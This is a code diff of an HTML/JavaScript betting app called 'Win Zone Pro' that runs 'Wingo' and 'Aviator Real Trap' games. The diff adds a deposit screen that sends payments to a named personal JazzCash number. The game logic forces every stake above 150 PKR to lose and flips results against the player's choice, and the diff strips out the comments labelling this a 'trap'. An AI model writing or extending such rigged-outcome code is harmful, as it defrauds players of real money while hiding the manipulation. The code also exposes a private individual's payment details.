@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Win Zone Pro - Elite Dual Engine App v3.3</title>
+    <title>Win Zone Pro - Elite Dual Engine App v3.4</title>
+    <!-- Firebase Libraries -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -127,6 +128,7 @@
         <div class="ticker-inner" id="tickerText">Loading transaction logs...</div>
     </div>
 
+    <!-- AUTH SCREEN -->
     <div id="authScreen" class="auth-container">
         <div id="loginCard" class="auth-card">
             <h2>Win Zone Login</h2>
@@ -145,9 +147,10 @@
         </div>
     </div>
 
+    <!-- MAIN APP SCREEN -->
     <div id="appScreen">
         <div class="header">
-            <span>👑 WIN ZONE AUTOMATED v3.3</span>
+            <span>👑 WIN ZONE AUTOMATED v3.4</span>
             <button class="logout-btn" onclick="handleLogout()">Logout</button>
         </div>
 
@@ -170,6 +173,7 @@
             <button class="tab-btn" id="tabAviator" onclick="switchGame('aviator')">Aviator Real Trap</button>
         </div>
 
+        <!-- GAME 1: WINGO WRAPPER -->
         <div id="wingoEngineWrapper" class="game-wrapper active">
             <div class="history-box">
                 <div class="history-title">
@@ -230,6 +234,7 @@
             </div>
         </div>
 
+        <!-- GAME 2: AVIATOR WRAPPER -->
         <div id="aviatorEngineWrapper" class="game-wrapper">
             <div class="aviator-display-box">
                 <div class="aviator-history-strip" id="aviatorHistory">
@@ -275,22 +280,55 @@
         </div>
     </div>
 
+    <!-- MODALS -->
+    <!-- DEPOSIT MODAL -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
-            <h3>Deposit Funds</h3>
-            <input type="number" id="depAmount" placeholder="Amount (Min 300)">
-            <input type="text" id="depTrx" placeholder="TRX ID">
-            <button class="submit-btn" onclick="closeModal('depositModal'); alert('Request Sent!');">Submit</button>
+            <h3 style="color: #10b981; margin-bottom: 5px; text-transform: uppercase;">Deposit Funds</h3>
+            
+            <!-- JazzCash Admin Details Box -->
+            <div style="background: #0f172a; padding: 12px; border-radius: 12px; border: 1px solid #f59e0b; margin-bottom: 15px; text-align: center;">
+                <p style="margin: 0; font-size: 12px; color: #f59e0b; font-weight: bold; text-transform: uppercase;">⚡ JAZZCASH ACCOUNT DETAILS</p>
+                <p style="margin: 6px 0 2px 0; font-size: 19px; color: #fff; font-weight: 900; letter-spacing: 1px;">03336448249</p>
+                <p style="margin: 0; font-size: 13px; color: #34d399; font-weight: bold;">Title: Nazar Hussain</p>
+            </div>
+
+            <div style="text-align: left; margin-bottom: 12px;">
+                <label style="font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Deposit Amount:</label>
+                <input type="number" id="depAmount" placeholder="Min Rs. 300" style="max-width: 100%; text-align: left;">
+            </div>
+
+            <div style="text-align: left; margin-bottom: 15px;">
+                <label style="font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Transaction ID / Track ID:</label>
+                <input type="text" id="depTrx" placeholder="Enter 12-Digit TRID" style="max-width: 100%; text-align: left;">
+            </div>
+
+            <button class="submit-btn" onclick="closeModal('depositModal'); alert('Your Deposit Request & Track ID has been sent to Admin for manual clearance!');">Submit Deposit Receipt</button>
             <button class="close-btn" onclick="closeModal('depositModal')">Cancel</button>
         </div>
     </div>
 
+    <!-- WITHDRAW MODAL -->
     <div id="withdrawModal" class="modal">
         <div class="modal-content">
-            <h3>Withdraw Request</h3>
-            <input type="text" id="withAccount" placeholder="Account Number">
-            <input type="number" id="withAmount" placeholder="Amount">
-            <button class="submit-btn" onclick="closeModal('withdrawModal'); alert('Pending Review!');">Request</button>
+            <h3 style="color: #ef4444; margin-bottom: 15px; text-transform: uppercase;">Withdraw Request</h3>
+            
+            <div style="text-align: left; margin-bottom: 12px;">
+                <label style="font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Account Number (EasyPaisa/JazzCash):</label>
+                <input type="text" id="withAccount" placeholder="e.g. 03XXXXXXXXX" style="max-width: 100%; text-align: left;">
+            </div>
+
+            <div style="text-align: left; margin-bottom: 12px;">
+                <label style="font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Account Title / Owner Name:</label>
+                <input type="text" id="withTitle" placeholder="Enter Account Title Name" style="max-width: 100%; text-align: left;">
+            </div>
+
+            <div style="text-align: left; margin-bottom: 15px;">
+                <label style="font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Withdraw Amount:</label>
+                <input type="number" id="withAmount" placeholder="Enter Payout Amount" style="max-width: 100%; text-align: left;">
+            </div>
+
+            <button class="submit-btn" style="background: linear-gradient(135deg, #ef4444, #b91c1c);" onclick="closeModal('withdrawModal'); alert('Your Cashout request is under manual verification!');">Request Withdrawal</button>
             <button class="close-btn" onclick="closeModal('withdrawModal')">Cancel</button>
         </div>
     </div>
@@ -583,7 +621,6 @@
                     let val = activeWingoBet.value;
                     let stake = activeWingoBet.amount;
 
-                    // ADVANCED TRAP: If single stake is higher than 150 PKR, target-force a losing vector automatically.
                     let shouldUserWin = (stake > 150) ? false : (Math.random() > 0.45);
 
                     if (shouldUserWin) {
@@ -605,7 +642,6 @@
                         database.ref('users/' + currentUser.uid).child('balance').set(currentBalance + winningPayout);
                         document.getElementById('wingoLogSection').innerHTML += `<div style="color: #10b981; font-weight:900;">🎉 Match Won! Added +PKR ${winningPayout}</div>`;
                     } else {
-                        // FORCE ANTI-BANKRUPTCY INTERVENTION
                         if (type === 'size') {
                             finalSizeResult = val === 'Big' ? 'Small' : 'Big';
                             finalNumberResult = finalSizeResult === 'Big' ? 6 : 2; 
